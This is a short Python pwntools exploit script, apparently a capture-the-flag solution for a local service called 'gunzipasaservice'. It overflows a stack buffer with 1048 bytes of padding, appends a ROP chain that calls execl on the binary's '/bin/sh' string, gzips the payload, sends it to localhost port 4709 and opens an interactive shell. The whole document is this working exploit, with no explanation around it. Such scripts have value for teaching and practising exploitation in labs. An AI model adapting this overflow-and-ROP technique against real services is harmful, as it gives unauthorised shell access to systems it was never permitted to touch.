from pwn import *
from subprocess import *

context.terminal = '/usr/bin/terminal'

#p = process("./gunzipasaservice")
p = remote("localhost",4709)
elf = ELF("./gunzipasaservice")
rop = ROP(elf)


BINSH_OFFSET = next(elf.search(b'/bin/sh'))

rop.execl(BINSH_OFFSET)
payload = b'A' * (1024 + 24)
payload += rop.chain()
print(rop.dump())
proc = Popen("gzip", stdin=PIPE, stdout=PIPE, stderr=STDOUT)

compressed = proc.communicate(input=payload)[0]
open("file.txt","wb").write(compressed)
p.send(compressed)
p.interactive()
